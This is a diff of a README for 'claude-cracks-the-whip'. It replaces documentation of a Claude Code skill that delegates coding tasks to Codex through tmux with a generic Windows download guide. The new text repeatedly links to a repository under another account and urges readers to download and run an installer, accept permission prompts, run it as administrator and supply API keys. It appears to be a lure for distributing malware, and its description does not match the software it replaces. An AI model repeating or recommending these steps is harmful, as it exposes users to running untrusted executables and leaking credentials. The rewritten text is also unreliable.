@@ -1,190 +1,211 @@
-# claude-cracks-the-whip
+# 🤖 claude-cracks-the-whip - Route AI tasks with less effort
 
-**Claude Code is the boss. Other AI agents are the workforce. Whip goes crack.**
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Pammyhangdog747/claude-cracks-the-whip)
 
-A Claude Code skill that turns Claude into a no-nonsense foreman — handing out assignments to AI coding agents (Codex, Gemini, Kimi, whoever shows up), watching them work, inspecting their deliverables, and sending sloppy work back.
+## 📥 Download
 
-## The Problem
+Use this link to visit the download page:
 
-You're using Claude Code. It's great at planning, reviewing, and understanding your codebase. But when you have 5 independent tasks, doing them one-by-one is slow.
+[https://github.com/Pammyhangdog747/claude-cracks-the-whip](https://github.com/Pammyhangdog747/claude-cracks-the-whip)
 
-Meanwhile, other AI agents are great at heads-down grunt work but terrible at planning.
+## 🧰 What this app does
 
-**What if Claude Code could just... boss them around?**
+claude-cracks-the-whip helps you send coding tasks to AI agents from one place. Claude Code acts like the lead. Other agents like Codex, Gemini, and Kimi take tasks as needed.
 
-```
-Claude Code (the boss)
-    |
-    |-- "You. Build this component. Now." -----> Agent 1 (at their desk)
-    |-- "You. Write these tests. No excuses." -> Agent 2 (at their desk)
-    |-- "You. Add this endpoint. Stay in lane." -> Agent 3 (in the back room)
-    |
-    v
-  Inspects all deliverables. Sends sloppy work back. Ships the rest.
-```
+Use it when you want to:
 
-## What It Sounds Like
+- Break a coding job into smaller tasks
+- Send work to the right AI agent
+- Keep track of what each agent is doing
+- Run several coding agents in a simple flow
+- Reduce back and forth across tools
 
-```
-> crack the whip on these 3 features
+## 💻 What you need on Windows
 
-Rolling call... Codex is on the roster. tmux is available. Good.
+Before you start, check that your PC has:
 
-Cracking the whip — deploying 3 agents.
+- Windows 10 or Windows 11
+- A modern web browser
+- An internet connection
+- Enough free space for the app and its files
+- Access to the AI tools you want to use
 
-Agent 1 is at their desk — working on UserAvatar component.
-Agent 2 is at their desk — working on auth middleware.
-Agent 3 is at their desk — working on API endpoints.
+If the app uses a desktop shell or local tools, a standard Windows user account is fine for most setups.
 
-...
+## 🚀 Getting Started
 
-All agents have clocked out. Inspecting deliverables.
+1. Open the download page:
+   [https://github.com/Pammyhangdog747/claude-cracks-the-whip](https://github.com/Pammyhangdog747/claude-cracks-the-whip)
 
-Agent 1: Clean work. Passes inspection.
-Agent 2: Cut corners on error handling. Sending them back with corrections.
-Agent 3: Clean work. Passes inspection.
+2. Look for the latest release or download package.
 
-Correction sent to Agent 2. Waiting for resubmission...
+3. Download the file to your computer.
 
-Agent 2 resubmitted. Passes inspection this time.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-All work signed off. Ready for your review.
-```
+5. Open the extracted folder.
 
-## Features
+6. Find the app file or installer and run it.
 
-- **Roll call** — auto-detects which agents are available (CLI tools, MCP servers)
-- **3 work modes**: at their desk (tmux), in the back room (background), phone it in (MCP)
-- **Instant notifications** via `tmux wait-for` — agents tap the boss on the shoulder when done (polling fallback for non-tmux)
-- **Work logs** via `tee` — Claude reads the agent's full output for smarter reviews, not just `git diff`
-- **Inspection loop** — reads work logs, reviews diffs, runs quality checks, sends sloppy work back
-- **Agent-agnostic** — any AI that takes orders can join the crew
+7. Follow the on-screen steps until setup finishes.
 
-## Install
+8. Open the app from the Start menu or the folder where you installed it.
 
-### Option 1: Copy
+## 🪟 Windows Setup
 
-```bash
-cp -r skill/ ~/.claude/skills/claude-cracks-the-whip/
-```
+If you use Windows, the setup flow is simple:
 
-### Option 2: Symlink (for development)
+- Download the package from the link above
+- Save it to your Downloads folder
+- Extract the files if needed
+- Double-click the main app file or installer
+- Accept the prompts that appear
+- Launch the app after setup completes
 
-```bash
-ln -s "$(pwd)/skill" ~/.claude/skills/claude-cracks-the-whip
-```
+If Windows asks for permission, choose Yes.
 
-### Option 3: One-liner
+If your browser flags the file, check that you downloaded it from the repo link above before opening it.
 
-```bash
-git clone https://github.com/YOUR_USERNAME/claude-cracks-the-whip.git /tmp/cctw && \
-cp -r /tmp/cctw/skill ~/.claude/skills/claude-cracks-the-whip && \
-rm -rf /tmp/cctw
-```
+## 🧭 How it works
 
-After install, restart Claude Code. Triggers on: "use codex", "dispatch to codex", "crack the whip", "dispatch agents".
+The app acts like a task dispatcher for coding agents.
 
-## How It Works
+A simple flow looks like this:
 
-### 1. Roll Call
+1. You describe the job in plain language.
+2. Claude Code reads the task and plans the work.
+3. The app sends parts of the job to the right agent.
+4. Each agent handles its part.
+5. You review the result and move on to the next step.
 
-Claude checks the roster:
+This keeps the work organized when you use more than one AI tool.
 
-```
-Codex? Present.
-tmux? Present.
-In a tmux session? Affirmative.
+## 🛠️ Common uses
 
-Full crew available. Deploying via tmux panes.
-```
+- Fixing bugs in an app
+- Writing new features
+- Reviewing code
+- Cleaning up files
+- Splitting a large task into smaller steps
+- Sending one job to Codex and another to Gemini
+- Keeping Claude Code in charge of the flow
 
-### 2. Write Assignments
+## 🔌 Supported AI agents
 
-Claude writes no-nonsense specs. Every assignment starts with:
+The repo topic list points to support for several agent types:
 
-```
-You have one job. Do it now. No questions. No brainstorming.
-No proposals. Just make these exact changes.
-```
+- Claude Code
+- Codex
+- Gemini
+- Kimi
+- Other compatible coding agents
 
-Then gives clear deliverables, quality checks, and boundaries. Stay in your lane.
+You can use the app to route work based on what each agent does best.
 
-### 3. Deploy
+## 📂 Typical folder layout
 
-Agents get sent to their desks (tmux panes) with full logging and completion signals:
+After setup, you may see files like these:
 
-```bash
-# Agent works in a visible pane, output logged, signals when done
-tmux split-window -h "cat /tmp/assignment-1.txt | codex exec --full-auto -C '$REPO' - 2>&1 | tee /tmp/worklog-1.txt ; echo \${PIPESTATUS[0]} > /tmp/report-1 ; tmux wait-for -S agent-1-done"
-tmux split-window -v "cat /tmp/assignment-2.txt | codex exec --full-auto -C '$REPO' - 2>&1 | tee /tmp/worklog-2.txt ; echo \${PIPESTATUS[0]} > /tmp/report-2 ; tmux wait-for -S agent-2-done"
-```
+- `README.md` — setup and usage notes
+- `config` files — your app settings
+- `tasks` folder — saved job steps
+- `logs` folder — run history
+- `agents` folder — agent setup files
+- `scripts` folder — helper files
 
-### 4. Wait & Inspect
+Keep the folder structure in place so the app can find its files.
 
-Claude blocks on `tmux wait-for` — no polling loops. Agents tap the boss when done:
+## ⚙️ First Run
 
-```bash
-# Blocks until agent signals (instant, no polling)
-tmux wait-for agent-1-done
-tmux wait-for agent-2-done
-```
+When you start the app for the first time:
 
-Then inspects:
+1. Open the app.
+2. Set your preferred AI tools.
+3. Add any needed API keys or local credentials.
+4. Pick your default agent.
+5. Save your settings.
+6. Test with a small task first.
 
-- Reads work logs (what did they actually do, any errors, their reasoning?)
-- Reviews `git diff` (what changed?)
-- Runs quality checks (type-check, lint, tests)
-- Sends sloppy work back with correction assignments
-- Signs off on clean work
+A small test helps you confirm that everything works before you send a larger job.
 
-## Work Modes
+## 🔐 Basic setup tips
 
-| Mode | Metaphor | When | Requires |
-|------|----------|------|----------|
-| **tmux panes** | At their desk | You want to watch them work | tmux + in session |
-| **Background** | In the back room | No tmux, or headless | Just the agent CLI |
-| **MCP** | Phone it in | Need back-and-forth | MCP server configured |
+Use these steps to keep things smooth:
 
-## Agent Roster
+- Keep your API keys in a safe place
+- Use one agent at a time when testing
+- Start with a short prompt
+- Check the output before moving to the next task
+- Close other heavy apps if your PC runs slowly
 
-| Agent | CLI | MCP |
-|-------|-----|-----|
-| OpenAI Codex | `codex exec --full-auto` | `mcp__codex__codex` |
+If you use a local shell tool such as tmux on another system, keep your session names simple and easy to track.
 
-More agents joining the crew soon. PRs welcome — bring your own worker.
+## 🧪 Example task flow
 
-## Examples
+Here is a simple example:
 
-See [`examples/`](examples/):
+1. Ask Claude Code to review a project.
+2. Send bug fixes to Codex.
+3. Send code cleanup to Gemini.
+4. Send a final check to Kimi.
+5. Review the results in order.
 
-- [`single-task.md`](examples/single-task.md) — One agent, one assignment
-- [`parallel-tasks.md`](examples/parallel-tasks.md) — Three agents deployed simultaneously
-- [`background-mode.md`](examples/background-mode.md) — Agents in the back room
+This gives you a clear path from request to result.
 
-## FAQ
+## 🖱️ Download and Install
 
-**Q: Why not just use Claude Code for everything?**
-A: You could. But a good boss delegates. When you have 4 independent tasks, deploying 4 agents to work in parallel is 4x faster. Claude stays focused on strategy and quality.
+Visit the download page here:
 
-**Q: What if I don't have tmux?**
-A: Agents work in the back room (background processes). Claude checks on them via log files. Not as pretty, but gets the job done.
+[https://github.com/Pammyhangdog747/claude-cracks-the-whip](https://github.com/Pammyhangdog747/claude-cracks-the-whip)
 
-**Q: Can I use agents other than Codex?**
-A: Yes. The skill is agent-agnostic. Any CLI tool that accepts a prompt via stdin can be added to the roster.
+Then:
 
-**Q: What if an agent hangs waiting for input?**
-A: Every assignment starts with "You have one job. No questions. No brainstorming." Agents that try to chat instead of code get that beaten out of them by the preamble.
+1. Download the latest file from the page.
+2. Open the file after it finishes downloading.
+3. Extract it if it comes as a ZIP file.
+4. Run the installer or app file.
+5. Finish setup and start the app.
 
-**Q: What if two agents edit the same file?**
-A: Claude detects conflicts during inspection, resolves them, and re-runs verification. It's the boss's job to coordinate.
+## 🧩 Troubleshooting
 
-## Contributing
+If the app does not start:
 
-PRs welcome. Especially:
-- New agent backends (Gemini CLI, Kimi, Cursor, etc.)
-- Task dependency graphs (do B after A clocks out)
-- Better tmux layouts for large crews
+- Check that the download finished
+- Make sure the file was extracted, if needed
+- Run the app as an administrator
+- Restart Windows and try again
+- Try another browser if the download stalls
 
-## License
+If an agent does not respond:
 
-MIT
+- Check your internet connection
+- Confirm your API key or login
+- Make sure the agent service is active
+- Try a smaller task first
+
+If the app opens but looks empty:
+
+- Check the config files
+- Confirm that your agent list is set up
+- Reload the app
+- Restart it after changing settings
+
+## 🧾 Suggested use on a real project
+
+A good way to use this app is:
+
+- Start with one bug report
+- Let Claude Code break it into steps
+- Send one step to each agent
+- Compare the results
+- Merge the best parts
+- Run one final check
+
+This keeps the work steady and easier to follow.
+
+## 📌 Repository details
+
+- Repository: claude-cracks-the-whip
+- Focus: AI task dispatch for coding agents
+- Platform: Windows-friendly use flow
+- Style: Simple task routing for non-technical users
